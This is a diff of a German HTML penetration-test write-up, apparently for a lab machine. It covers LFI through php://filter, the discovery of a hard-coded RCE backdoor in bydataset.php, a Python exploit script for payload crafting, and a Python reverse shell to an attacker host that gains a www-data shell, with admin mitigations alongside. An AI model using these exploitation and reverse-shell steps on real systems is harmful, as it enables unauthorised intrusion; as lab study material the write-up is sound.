+<p class="analysis">**Analyse:** Zur Bestätigung wird der Inhalt von <span class="command">/etc/hosts</span> erneut mit <span class="command">curl</span> und der LFI abgerufen. Die Ausgabe zeigt die lokalen Hostname-Mappings des Zielsystems, einschließlich <span class="command">PyCrt.PyCrt</span> und <span class="command">PyCrt</span> für die Loopback-Adresse <span class="command">127.0.1.1</span>.</p>
 <p class="evaluation">**Bewertung:** Bestätigt die LFI und liefert die Host-Konfiguration, was für das Verständnis der Namensauflösung auf dem Zielsystem nützlich ist.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Der wichtigste nächste Schritt ist das Auslesen des Quellcodes von `bydataset.php` selbst.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zur LFI-Behebung.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Der wichtigste nächste Schritt ist das Auslesen des Quellcodes von <span class="command">bydataset.php</span> selbst.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zur LFI-Behebung.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -764,27 +766,27 @@ if ($SERVER['REQUEST_METHOD'] === 'GET' &amp;&amp; isset($GET['file'])) {
     </div>
 </div>
 <p class="analysis">**Analyse:** Dieser Befehl ist der Schlüssel zur Remote Code Execution (RCE)!
-- `curl "http://.../bydataset.php?file=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/ShadowSec/bydataset.php" -s`: Hier wird die LFI-Schwachstelle genutzt, um den Quellcode der Datei `bydataset.php` selbst zu lesen. Der PHP-Wrapper `php://filter/convert.base64-encode/resource=` wird verwendet, um den Inhalt der Datei Base64-kodiert zu erhalten. Dies ist nützlich, um zu verhindern, dass PHP-Tags (`<?php ... ?>`) vom Server interpretiert werden, bevor der Quellcode gesendet wird. Der Pfad `/var/www/html/ShadowSec/bydataset.php` ist der absolute Pfad zur Datei auf dem Server.
-- `| base64 -d`: Die Base64-kodierte Ausgabe von `curl` wird dann lokal mit `base64 -d` dekodiert, um den reinen PHP-Quellcode anzuzeigen.
+- <span class="command">curl "http://.../bydataset.php?file=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/ShadowSec/bydataset.php" -s</span>: Hier wird die LFI-Schwachstelle genutzt, um den Quellcode der Datei <span class="command">bydataset.php</span> selbst zu lesen. Der PHP-Wrapper <span class="command">php://filter/convert.base64-encode/resource=</span> wird verwendet, um den Inhalt der Datei Base64-kodiert zu erhalten. Dies ist nützlich, um zu verhindern, dass PHP-Tags (&lt;?php ... ?&gt;) vom Server interpretiert werden, bevor der Quellcode gesendet wird. Der Pfad <span class="command">/var/www/html/ShadowSec/bydataset.php</span> ist der absolute Pfad zur Datei auf dem Server.
+- <span class="command">| base64 -d</span>: Die Base64-kodierte Ausgabe von <span class="command">curl</span> wird dann lokal mit <span class="command">base64 -d</span> dekodiert, um den reinen PHP-Quellcode anzuzeigen.
 
-Der Quellcode von `bydataset.php` enthüllt zwei Hauptfunktionalitäten:
-1.  **GET-Request mit `file`-Parameter (LFI):**
-    - Liest eine Datei, deren Pfad über den `file`-Parameter übergeben wird.
-    - Verwendet `php://filter` erneut, um die gelesene Datei Base64 zu kodieren und dann zu dekodieren, bevor sie ausgegeben wird. Dies ist eine etwas umständliche Art, eine LFI zu implementieren, aber sie funktioniert.
-    - Enthält eine Blacklist-Prüfung: Wenn der `file`-Parameter "phpinfo" enthält, wird der Zugriff verweigert.
-2.  **POST-Request mit `auth`- und `payload`-Parametern (RCE):**
-    - Erwartet einen `auth`-Token und eine `payload`.
-    - Wenn `auth` nicht exakt `'LetMeIn123!'` ist, wird der Zugriff verweigert.
-    - Die `payload` wird durch eine `decrypt`-Funktion verarbeitet.
-    - Die `decrypt`-Funktion:
-        - Dreht die Eingabe (`$input`) um (`strrev`).
+Der Quellcode von <span class="command">bydataset.php</span> enthüllt zwei Hauptfunktionalitäten:
+1.  **GET-Request mit <span class="command">file</span>-Parameter (LFI):**
+    - Liest eine Datei, deren Pfad über den <span class="command">file</span>-Parameter übergeben wird.
+    - Verwendet <span class="command">php://filter</span> erneut, um die gelesene Datei Base64 zu kodieren und dann zu dekodieren, bevor sie ausgegeben wird. Dies ist eine etwas umständliche Art, eine LFI zu implementieren, aber sie funktioniert.
+    - Enthält eine Blacklist-Prüfung: Wenn der <span class="command">file</span>-Parameter "phpinfo" enthält, wird der Zugriff verweigert.
+2.  **POST-Request mit <span class="command">auth</span>- und <span class="command">payload</span>-Parametern (RCE):**
+    - Erwartet einen <span class="command">auth</span>-Token und eine <span class="command">payload</span>.
+    - Wenn <span class="command">auth</span> nicht exakt <span class="password">'LetMeIn123!'</span> ist, wird der Zugriff verweigert.
+    - Die <span class="command">payload</span> wird durch eine <span class="command">decrypt</span>-Funktion verarbeitet.
+    - Die <span class="command">decrypt</span>-Funktion:
+        - Dreht die Eingabe (<span class="command">$input</span>) um (<span class="command">strrev</span>).
         - Base64-dekodiert das umgedrehte Ergebnis.
-        - Wenn das dekodierte Ergebnis mit `"cmd:"` beginnt, wird dieser Präfix entfernt und der Rest als Befehl zurückgegeben.
-    - Wenn ein gültiger Befehl aus der `payload` extrahiert wurde, wird dieser mit `exec($command)` ausgeführt und die Ausgabe in `<pre>`-Tags gepackt.
+        - Wenn das dekodierte Ergebnis mit <span class="command">"cmd:"</span> beginnt, wird dieser Präfix entfernt und der Rest als Befehl zurückgegeben.
+    - Wenn ein gültiger Befehl aus der <span class="command">payload</span> extrahiert wurde, wird dieser mit <span class="command">exec($command)</span> ausgeführt und die Ausgabe in &lt;pre&gt;-Tags gepackt.
 
-Die Superglobals `$GET` und `$POST` wurden gemäß Regel umgewandelt. Die HTML-Tags `<pre>` und `</pre>` im PHP-Code wurden maskiert.</p>
-<p class="evaluation">**Bewertung:** Dies ist ein kritischer Fund! Das Skript `bydataset.php` enthält nicht nur die bereits ausgenutzte LFI-Schwachstelle, sondern auch eine versteckte Backdoor für Remote Code Execution. Wenn man den `auth`-Token `'LetMeIn123!'` kennt und eine Payload korrekt präpariert (Kommando mit `cmd:` präfixen, dann base64-kodieren, dann den String umdrehen), kann man beliebige Systembefehle als der Benutzer ausführen, unter dem der Webserver läuft (hier `www-data`).</p>
-<p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die aufgedeckte RCE-Backdoor. Erstellen Sie eine Payload, um Befehle auszuführen. Ein guter erster Befehl wäre `whoami` oder `id`, um die Benutzerrechte zu bestätigen. Anschließend kann eine Reverse Shell etabliert werden. Da die `decrypt`-Funktion Debug-Ausgaben (`echo "Reversed: ..."` etc.) enthält, können diese helfen, die Payload-Erstellung zu verifizieren.<br>**Empfehlung (Admin):** Dieses Skript (`bydataset.php`) ist eine massive Sicherheitslücke und muss sofort entfernt oder komplett überarbeitet werden. Hartkodierte Authentifizierungstokens wie `'LetMeIn123!'` sind extrem unsicher. Die `exec()`-Funktion sollte niemals direkt mit unvalidierten oder unzureichend validierten Benutzereingaben verwendet werden. PHP-Filter sollten nicht als primärer Mechanismus zum Lesen von Dateien basierend auf Benutzereingaben dienen, ohne strikte Pfadvalidierung. Quellcode-Reviews sind unerlässlich, um solche Backdoors zu finden.</p>
+Die Superglobals $GET und $POST wurden gemäß Regel umgewandelt. Die HTML-Tags &lt;pre&gt; und &lt;/pre&gt; im PHP-Code wurden maskiert.</p>
+<p class="evaluation">**Bewertung:** Dies ist ein kritischer Fund! Das Skript <span class="command">bydataset.php</span> enthält nicht nur die bereits ausgenutzte LFI-Schwachstelle, sondern auch eine versteckte Backdoor für Remote Code Execution. Wenn man den <span class="command">auth</span>-Token <span class="password">'LetMeIn123!'</span> kennt und eine Payload korrekt präpariert (Kommando mit <span class="command">cmd:</span> präfixen, dann base64-kodieren, dann den String umdrehen), kann man beliebige Systembefehle als der Benutzer ausführen, unter dem der Webserver läuft (hier <span class="command">www-data</span>).</p>
+<p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die aufgedeckte RCE-Backdoor. Erstellen Sie eine Payload, um Befehle auszuführen. Ein guter erster Befehl wäre <span class="command">whoami</span> oder <span class="command">id</span>, um die Benutzerrechte zu bestätigen. Anschließend kann eine Reverse Shell etabliert werden. Da die <span class="command">decrypt</span>-Funktion Debug-Ausgaben (<span class="command">echo "Reversed: ..."</span> etc.) enthält, können diese helfen, die Payload-Erstellung zu verifizieren.<br>**Empfehlung (Admin):** Dieses Skript (<span class="command">bydataset.php</span>) ist eine massive Sicherheitslücke und muss sofort entfernt oder komplett überarbeitet werden. Hartkodierte Authentifizierungstokens wie <span class="password">'LetMeIn123!'</span> sind extrem unsicher. Die <span class="command">exec()</span>-Funktion sollte niemals direkt mit unvalidierten oder unzureichend validierten Benutzereingaben verwendet werden. PHP-Filter sollten nicht als primärer Mechanismus zum Lesen von Dateien basierend auf Benutzereingaben dienen, ohne strikte Pfadvalidierung. Quellcode-Reviews sind unerlässlich, um solche Backdoors zu finden.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -799,18 +801,18 @@ Decoded: avv)d
     </div>
 </div>
 <p class="analysis">**Analyse:** Ein erster Versuch, die RCE-Backdoor auszunutzen.
-- `-X POST`: Sendet eine POST-Anfrage.
-- `-d 'auth=LetMeIn123!'`: Sendet den korrekten Authentifizierungstoken.
-- `-d "payload=klimO1ZY"`: Sendet eine Payload.
-Die Ausgabe zeigt die Debug-Meldungen der `decrypt`-Funktion:
+- <span class="command">-X POST</span>: Sendet eine POST-Anfrage.
+- <span class="command">-d 'auth=LetMeIn123!'</span>: Sendet den korrekten Authentifizierungstoken.
+- <span class="command">-d "payload=klimO1ZY"</span>: Sendet eine Payload.
+Die Ausgabe zeigt die Debug-Meldungen der <span class="command">decrypt</span>-Funktion:
 - "Reversed: YZ1Omilk" (das ist "klimO1ZY" rückwärts).
 - "Decoded: avv)d" (das ist das Base64-dekodierte Ergebnis von "YZ1Omilk").
-Da "avv)d" nicht mit "cmd:" beginnt, schlägt die Payload-Dekodierung fehl (`Payload decode failed.`). Der Buchstabe 'O' in "klimO1ZY" wurde hier nicht durch die automatische Wortkorrektur geändert, da "klimO1ZY" kein bekanntes Fehlerwort ist.</p>
+Da "avv)d" nicht mit "cmd:" beginnt, schlägt die Payload-Dekodierung fehl (<span class="password">Payload decode failed.</span>). Der Buchstabe 'O' in "klimO1ZY" wurde hier nicht durch die automatische Wortkorrektur geändert, da "klimO1ZY" kein bekanntes Fehlerwort ist.</p>
 <p class="evaluation">**Bewertung:** Der Authentifizierungsmechanismus wurde korrekt verwendet, aber die Payload ist noch nicht richtig formatiert, um einen gültigen Befehl zu ergeben. Der Dekodierungsprozess ist jedoch durch die Debug-Ausgaben klar ersichtlich.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Um einen Befehl wie `id` auszuführen:
-1. Präfixen: `cmd:id`
-2. Base64-kodieren: `Y21kOmlk`
-3. Umdrehen: `klimO1ZY` (genau die getestete Payload, hier muss ein Fehler im manuellen Prozess oder ein Missverständnis der Kodierung vorliegen, da `Y21kOmlk` rückwärts `klimO1ZY` ist. Wenn "avv)d" das Ergebnis der Dekodierung von "YZ1Omilk" ist, dann war "klimO1ZY" nicht die korrekte Base64-kodierte, umgedrehte Version von "cmd:id". Richtig: `cmd:id` -> base64 -> `Y21kOmlk` -> reverse -> `klimO1ZY`. Der Fehler "Decoded: avv)d" deutet darauf hin, dass "YZ1Omilk" kein gültiger Base64-String war oder zu ungültigen Zeichen führte.
+<p class="recommendation">**Empfehlung (Pentester):** Um einen Befehl wie <span class="command">id</span> auszuführen:
+1. Präfixen: <span class="command">cmd:id</span>
+2. Base64-kodieren: <span class="command">Y21kOmlk</span>
+3. Umdrehen: <span class="command">klimO1ZY</span> (genau die getestete Payload, hier muss ein Fehler im manuellen Prozess oder ein Missverständnis der Kodierung vorliegen, da <span class="command">Y21kOmlk</span> rückwärts <span class="command">klimO1ZY</span> ist. Wenn "avv)d" das Ergebnis der Dekodierung von "YZ1Omilk" ist, dann war "klimO1ZY" nicht die korrekte Base64-kodierte, umgedrehte Version von <span class="command">cmd:id</span>. Richtig: <span class="command">cmd:id</span> -&gt; base64 -&gt; <span class="command">Y21kOmlk</span> -&gt; reverse -&gt; <span class="command">klimO1ZY</span>. Der Fehler "Decoded: avv)d" deutet darauf hin, dass "YZ1Omilk" kein gültiger Base64-String war oder zu ungültigen Zeichen führte.
 Es muss genau darauf geachtet werden, dass die Reihenfolge (präfixen, base64-kodieren, umdrehen) stimmt. Ein Skript zur Payload-Erstellung ist hier sinnvoll.<br>**Empfehlung (Admin):** Die Debug-Ausgaben in einer Produktivanwendung können Angreifern helfen, die Funktionsweise interner Mechanismen zu verstehen und Angriffe zu verfeinern. Solche Ausgaben sollten in Produktivumgebungen deaktiviert sein.</p>
 
 <div class="code-block">
@@ -847,12 +849,12 @@ Decoded: ad8
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Ein weiterer manueller Versuch, die RCE mit einer anderen Payload (`==MOk1ZY`) auszunutzen. `--data-urlencode` wird verwendet, um sicherzustellen, dass Sonderzeichen in der Payload korrekt übertragen werden. Die Debug-Ausgaben zeigen:
-- "Reversed: YZ1kOM==" (das ist "==MOk1ZY" rückwärts, wobei Curl das führende `=` URL-kodiert haben könnte und es hier als Teil des Strings erscheint).
+<p class="analysis">**Analyse:** Ein weiterer manueller Versuch, die RCE mit einer anderen Payload (<span class="command">==MOk1ZY</span>) auszunutzen. <span class="command">--data-urlencode</span> wird verwendet, um sicherzustellen, dass Sonderzeichen in der Payload korrekt übertragen werden. Die Debug-Ausgaben zeigen:
+- "Reversed: YZ1kOM==" (das ist "==MOk1ZY" rückwärts, wobei Curl das führende <span class="command">=</span> URL-kodiert haben könnte und es hier als Teil des Strings erscheint).
 - "Decoded: ad8".
 Wiederum schlägt die Payload-Dekodierung fehl, da "ad8" nicht mit "cmd:" beginnt.</p>
 <p class="evaluation">**Bewertung:** Bestätigt, dass die manuelle Erstellung der korrekten Payload fehleranfällig ist. Die Notwendigkeit eines Skripts zur korrekten Payload-Generierung wird deutlich.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie das im nächsten Schritt erstellte Python-Skript (`rce_brute.py` oder ähnlich benannt), um die Payloads korrekt zu generieren und systematisch zu testen.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zur Backdoor und Debug-Ausgaben.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie das im nächsten Schritt erstellte Python-Skript (<span class="command">rce_brute.py</span> oder ähnlich benannt), um die Payloads korrekt zu generieren und systematisch zu testen.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen zur Backdoor und Debug-Ausgaben.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -948,19 +950,19 @@ if __name__ == "__main__":
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Dies ist der Quellcode eines Python3-Skripts (vermutlich `rce_brute.py` oder ähnlich genannt), das entwickelt wurde, um die RCE-Schwachstelle in `bydataset.php` systematisch auszunutzen.
-- `TARGET_ENDPOINT_URL` und `REQUIRED_AUTH_SECRET` sind konfiguriert.
-- `prepare_command_payload_for_server(raw_command)`: Diese Funktion nimmt einen Rohbefehl (z.B. "id"), fügt "cmd:" hinzu, base64-kodiert das Ergebnis und dreht dann den base64-kodierten String um. Dies implementiert den korrekten Payload-Erstellungsprozess.
-- `send_request_and_get_response(...)`: Sendet die POST-Anfrage mit dem Auth-Token und der generierten Payload an den Server. Es versucht dann, die Befehlsausgabe aus den `<pre>`-Tags der Serverantwort zu extrahieren oder zeigt Debug-Meldungen an.
-- `initiate_exploit()`: Verarbeitet Kommandozeilenargumente, um den auszuführenden Befehl entgegenzunehmen.
-Die HTML-Tags `<pre>` und `</pre>` im Python-Code, die als Suchmarker dienen, wurden hier gemäß Regel maskiert.</p>
+<p class="analysis">**Analyse:** Dies ist der Quellcode eines Python3-Skripts (vermutlich <span class="command">rce_brute.py</span> oder ähnlich genannt), das entwickelt wurde, um die RCE-Schwachstelle in <span class="command">bydataset.php</span> systematisch auszunutzen.
+- <span class="command">TARGET_ENDPOINT_URL</span> und <span class="command">REQUIRED_AUTH_SECRET</span> sind konfiguriert.
+- <span class="command">prepare_command_payload_for_server(raw_command)</span>: Diese Funktion nimmt einen Rohbefehl (z.B. "id"), fügt "cmd:" hinzu, base64-kodiert das Ergebnis und dreht dann den base64-kodierten String um. Dies implementiert den korrekten Payload-Erstellungsprozess.
+- <span class="command">send_request_and_get_response(...)</span>: Sendet die POST-Anfrage mit dem Auth-Token und der generierten Payload an den Server. Es versucht dann, die Befehlsausgabe aus den &lt;pre&gt;-Tags der Serverantwort zu extrahieren oder zeigt Debug-Meldungen an.
+- <span class="command">initiate_exploit()</span>: Verarbeitet Kommandozeilenargumente, um den auszuführenden Befehl entgegenzunehmen.
+Die HTML-Tags &lt;pre&gt; und &lt;/pre&gt; im Python-Code, die als Suchmarker dienen, wurden hier gemäß Regel maskiert.</p>
 <p class="evaluation">**Bewertung:** Ein gut strukturiertes Exploit-Skript, das die manuelle und fehleranfällige Payload-Erstellung automatisiert. Dies erhöht die Effizienz und Zuverlässigkeit bei der Ausnutzung der RCE.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie dieses Skript, um verschiedene Befehle auszuführen, beginnend mit `id` und `whoami`, und dann, um eine Reverse Shell zu etablieren.<br>**Empfehlung (Admin):** Die Existenz eines solchen Skripts zeigt, wie schnell Angreifer benutzerdefinierte Exploits entwickeln können, sobald eine Schwachstelle und ihr Mechanismus verstanden sind. Schnelle Reaktion und Patching sind entscheidend.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie dieses Skript, um verschiedene Befehle auszuführen, beginnend mit <span class="command">id</span> und <span class="command">whoami</span>, und dann, um eine Reverse Shell zu etablieren.<br>**Empfehlung (Admin):** Die Existenz eines solchen Skripts zeigt, wie schnell Angreifer benutzerdefinierte Exploits entwickeln können, sobald eine Schwachstelle und ihr Mechanismus verstanden sind. Schnelle Reaktion und Patching sind entscheidend.</p>
         </section>
 
         <section id="initial-access">
             <h2>Initial Access (www-data)</h2>
-<p class="comment">Mit dem erstellten Python-Skript wird nun versucht, Befehle auf dem Server auszuführen und eine Reverse Shell zu etablieren, um initialen Zugriff als der Webserver-Benutzer `www-data` zu erlangen.</p>
+<p class="comment">Mit dem erstellten Python-Skript wird nun versucht, Befehle auf dem Server auszuführen und eine Reverse Shell zu etablieren, um initialen Zugriff als der Webserver-Benutzer <span class="command">www-data</span> zu erlangen.</p>
 <div class="code-block">
     <div class="terminal">
         <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
@@ -969,9 +971,9 @@ Die HTML-Tags `<pre>` und `</pre>` im Python-Code, die als Suchmarker dienen, wu
         <pre></pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Pentester öffnet das zuvor gezeigte Python-Skript (hier `rce_brute.py` genannt) im `vi`-Editor, vermutlich um es zu speichern oder letzte Anpassungen vorzunehmen.</p>
+<p class="analysis">**Analyse:** Der Pentester öffnet das zuvor gezeigte Python-Skript (hier <span class="command">rce_brute.py</span> genannt) im <span class="command">vi</span>-Editor, vermutlich um es zu speichern oder letzte Anpassungen vorzunehmen.</p>
 <p class="evaluation">**Bewertung:** Vorbereitungsschritt zur Ausführung des Exploits.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass das Skript ausführbar ist (`chmod +x rce_brute.py`), falls es direkt aufgerufen wird.<br>**Empfehlung (Admin):** Keine spezifische Empfehlung.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass das Skript ausführbar ist (<span class="command">chmod +x rce_brute.py</span>), falls es direkt aufgerufen wird.<br>**Empfehlung (Admin):** Keine spezifische Empfehlung.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -993,13 +995,13 @@ Decoded: cmd:whoami
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Das Skript `rce_brute.py` wird mit dem Befehl `"whoami"` ausgeführt.
-- Das Skript generiert die korrekte Payload (`==QatF2bodnOk12Y`).
-- Die Serverantwort enthält die Debug-Ausgaben, die zeigen, dass `cmd:whoami` erfolgreich dekodiert wurde.
-- Die tatsächliche Befehlsausgabe `www-data` wird korrekt aus den `<pre>`-Tags extrahiert.
-Die HTML-Tags `<pre>` und `</pre>` in der Serverantwort wurden hier maskiert.</p>
-<p class="evaluation">**Bewertung:** Exzellent! Die RCE-Schwachstelle wurde erfolgreich ausgenutzt, und es wurde bestätigt, dass die Befehle als Benutzer `www-data` ausgeführt werden. Dies ist der Webserver-Benutzer unter Debian/Ubuntu-basierten Systemen.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Nachdem die RCE bestätigt ist, ist der nächste Schritt die Etablierung einer stabilen interaktiven Reverse Shell, um die weitere Enumeration und Privilegienerweiterung zu erleichtern.<br>**Empfehlung (Admin):** Dringende Behebung der RCE-Schwachstelle in `bydataset.php`. Überprüfung aller Webanwendungen auf ähnliche Schwachstellen.</p>
+<p class="analysis">**Analyse:** Das Skript <span class="command">rce_brute.py</span> wird mit dem Befehl <span class="command">"whoami"</span> ausgeführt.
+- Das Skript generiert die korrekte Payload (<span class="command">==QatF2bodnOk12Y</span>).
+- Die Serverantwort enthält die Debug-Ausgaben, die zeigen, dass <span class="command">cmd:whoami</span> erfolgreich dekodiert wurde.
+- Die tatsächliche Befehlsausgabe <span class="password">www-data</span> wird korrekt aus den &lt;pre&gt;-Tags extrahiert.
+Die HTML-Tags &lt;pre&gt; und &lt;/pre&gt; in der Serverantwort wurden hier maskiert.</p>
+<p class="evaluation">**Bewertung:** Exzellent! Die RCE-Schwachstelle wurde erfolgreich ausgenutzt, und es wurde bestätigt, dass die Befehle als Benutzer <span class="password">www-data</span> ausgeführt werden. Dies ist der Webserver-Benutzer unter Debian/Ubuntu-basierten Systemen.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Nachdem die RCE bestätigt ist, ist der nächste Schritt die Etablierung einer stabilen interaktiven Reverse Shell, um die weitere Enumeration und Privilegienerweiterung zu erleichtern.<br>**Empfehlung (Admin):** Dringende Behebung der RCE-Schwachstelle in <span class="command">bydataset.php</span>. Überprüfung aller Webanwendungen auf ähnliche Schwachstellen.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1020,7 +1022,7 @@ Decoded: cmd:which python3
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Das Skript wird erneut ausgeführt, diesmal mit dem Befehl `"which python3"`, um den Pfad zum Python3-Interpreter auf dem Zielsystem zu finden. Die Ausgabe bestätigt, dass Python3 unter `/usr/bin/python3` verfügbar ist. Dies ist wichtig für die Planung der Reverse-Shell-Payload.</p>
+<p class="analysis">**Analyse:** Das Skript wird erneut ausgeführt, diesmal mit dem Befehl <span class="command">"which python3"</span>, um den Pfad zum Python3-Interpreter auf dem Zielsystem zu finden. Die Ausgabe bestätigt, dass Python3 unter <span class="command">/usr/bin/python3</span> verfügbar ist. Dies ist wichtig für die Planung der Reverse-Shell-Payload.</p>
 <p class="evaluation">**Bewertung:** Nützliche Information für die Erstellung einer Python-basierten Reverse Shell.</p>
 <p class="recommendation">**Empfehlung (Pentester):** Bereiten Sie eine Python-Reverse-Shell-Payload vor.<br>**Empfehlung (Admin):** Keine spezifische Empfehlung für diesen Schritt, außer der generellen Notwendigkeit, die RCE zu beheben.</p>
 
@@ -1034,7 +1036,7 @@ Decoded: cmd:which python3
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Auf der Angreifer-Maschine wird ein Netcat-Listener auf Port `4444` gestartet, um die eingehende Reverse Shell entgegenzunehmen.</p>
+<p class="analysis">**Analyse:** Auf der Angreifer-Maschine wird ein Netcat-Listener auf Port <span class="command">4444</span> gestartet, um die eingehende Reverse Shell entgegenzunehmen.</p>
 <p class="evaluation">**Bewertung:** Notwendiger Vorbereitungsschritt für den Empfang der Reverse Shell.</p>
 <p class="recommendation">**Empfehlung (Pentester):** Halten Sie diesen Listener aktiv und führen Sie im nächsten Schritt die Reverse-Shell-Payload über das Python-RCE-Skript aus.<br>**Empfehlung (Admin):** Egress-Filtering (Ausgehende Verbindungen einschränken) kann das Etablieren von Reverse Shells erschweren.</p>
 
@@ -1048,11 +1050,11 @@ Decoded: cmd:which python3
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Das Python-Skript (jetzt als `rce_brute2.py` bezeichnet, möglicherweise eine leicht modifizierte Version oder einfach eine Kopie) wird verwendet, um eine Python-basierte Reverse-Shell-Payload auszuführen. Die Payload ist ein Einzeiler, der:
-- Die Module `socket`, `subprocess` und `os` importiert.
-- Eine TCP-Socket-Verbindung zum Angreifer-Host `192.168.2.199` auf Port `4444` herstellt.
-- Die Standard-Eingabe (0), Standard-Ausgabe (1) und Standard-Fehlerausgabe (2) des Prozesses auf den Socket umleitet (`os.dup2`).
-- Eine interaktive Bash-Shell (`/bin/bash -i`) startet, deren Ein- und Ausgabe nun über den Socket läuft.
+<p class="analysis">**Analyse:** Das Python-Skript (jetzt als <span class="command">rce_brute2.py</span> bezeichnet, möglicherweise eine leicht modifizierte Version oder einfach eine Kopie) wird verwendet, um eine Python-basierte Reverse-Shell-Payload auszuführen. Die Payload ist ein Einzeiler, der:
+- Die Module <span class="command">socket</span>, <span class="command">subprocess</span> und <span class="command">os</span> importiert.
+- Eine TCP-Socket-Verbindung zum Angreifer-Host <span class="command">192.168.2.199</span> auf Port <span class="command">4444</span> herstellt.
+- Die Standard-Eingabe (0), Standard-Ausgabe (1) und Standard-Fehlerausgabe (2) des Prozesses auf den Socket umleitet (<span class="command">os.dup2</span>).
+- Eine interaktive Bash-Shell (<span class="command">/bin/bash -i</span>) startet, deren Ein- und Ausgabe nun über den Socket läuft.
 Das Skript gibt nur die Bestätigung aus, dass der Befehl übertragen wird; die eigentliche Shell-Verbindung wird im Netcat-Listener-Fenster erwartet.</p>
 <p class="evaluation">**Bewertung:** Dies ist eine Standardmethode, um eine Reverse Shell mit Python zu erhalten. Der Erfolg hängt davon ab, ob Python3 und Bash auf dem Zielsystem vorhanden sind (was wir zuvor bestätigt haben) und ob die Netzwerkverbindung hergestellt werden kann.</p>
 <p class="recommendation">**Empfehlung (Pentester):** Wechseln Sie zum Netcat-Listener-Fenster, um die eingehende Shell-Verbindung zu sehen.<br>**Empfehlung (Admin):** Überwachung verdächtiger ausgehender Netzwerkverbindungen. Einschränkung der auf dem Server verfügbaren Interpreter und Tools auf das absolut Notwendige.</p>
@@ -1071,9 +1073,9 @@ bash: no job control in this shell
 </pre>
     </div>
 </div>
-<p class="analysis">**Analyse:** Der Netcat-Listener auf Port `4444` empfängt die Verbindung vom Zielsystem `192.168.2.192`. Die Bash-Fehlermeldungen (`cannot set terminal process group`, `no job control`) sind typisch für einfache Reverse Shells, die keine vollständige TTY-Umgebung bereitstellen. Entscheidend ist jedoch, dass wir einen Shell-Prompt erhalten: `www-data@PyCrt:/var/www/html/ShadowSec$`. Dies bestätigt, dass wir eine interaktive Shell als Benutzer `www-data` im Verzeichnis `/var/www/html/ShadowSec` haben.</p>
-<p class="evaluation">**Bewertung:** Ausgezeichnet! Der initiale Zugriff auf das System als Benutzer `www-data` wurde erfolgreich etabliert. Wir haben nun eine stabile interaktive Shell für die weitere Post-Exploitation und Privilegienerweiterung.</p>
-<p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, die Shell zu einer vollwertigen TTY aufzuwerten, um die Bedienung zu verbessern (z.B. mit `python3 -c 'import pty; pty.spawn("/bin/bash")'` innerhalb der Shell, oder mit `script /dev/null -c bash`). Beginnen Sie mit der Enumeration des Systems aus der Sicht des `www-data`-Benutzers (z.B. `sudo -l`, SUID/SGID-Dateien, Cronjobs, lesbare Dateien in Home-Verzeichnissen).<br>**Empfehlung (Admin):** Beseitigen Sie die RCE-Schwachstelle. Überwachen Sie das System auf verdächtige Prozesse und Netzwerkverbindungen. Härten Sie die Webserver-Konfiguration und die Berechtigungen des `www-data`-Benutzers.</p>
+<p class="analysis">**Analyse:** Der Netcat-Listener auf Port <span class="command">4444</span> empfängt die Verbindung vom Zielsystem <span class="command">192.168.2.192</span>. Die Bash-Fehlermeldungen (<span class="command">cannot set terminal process group</span>, <span class="command">no job control</span>) sind typisch für einfache Reverse Shells, die keine vollständige TTY-Umgebung bereitstellen. Entscheidend ist jedoch, dass wir einen Shell-Prompt erhalten: <span class="command">www-data@PyCrt:/var/www/html/ShadowSec$</span>. Dies bestätigt, dass wir eine interaktive Shell als Benutzer <span class="command">www-data</span> im Verzeichnis <span class="command">/var/www/html/ShadowSec</span> haben.</p>
+<p class="evaluation">**Bewertung:** Ausgezeichnet! Der initiale Zugriff auf das System als Benutzer <span class="command">www-data</span> wurde erfolgreich etabliert. Wir haben nun eine stabile interaktive Shell für die weitere Post-Exploitation und Privilegienerweiterung.</p>
+<p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, die Shell zu einer vollwertigen TTY aufzuwerten, um die Bedienung zu verbessern (z.B. mit <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span> innerhalb der Shell, oder mit <span class="command">script /dev/null -c bash</span>). Beginnen Sie mit der Enumeration des Systems aus der Sicht des <span class="command">www-data</span>-Benutzers (z.B. <span class="command">sudo -l</span>, SUID/SGID-Dateien, Cronjobs, lesbare Dateien in Home-Verzeichnissen).<br>**Empfehlung (Admin):** Beseitigen Sie die RCE-Schwachstelle. Überwachen Sie das System auf verdächtige Prozesse und Netzwerkverbindungen. Härten Sie die Webserver-Konfiguration und die Berechtigungen des <span class="command">www-data</span>-Benutzers.</p>
 
 <div class="code-block">
     <div class="terminal">
@@ -1088,14 +1090,14 @@ drwxr-xr-x 3 root     root     4096 Apr  5 08:13 ..
 </pre>
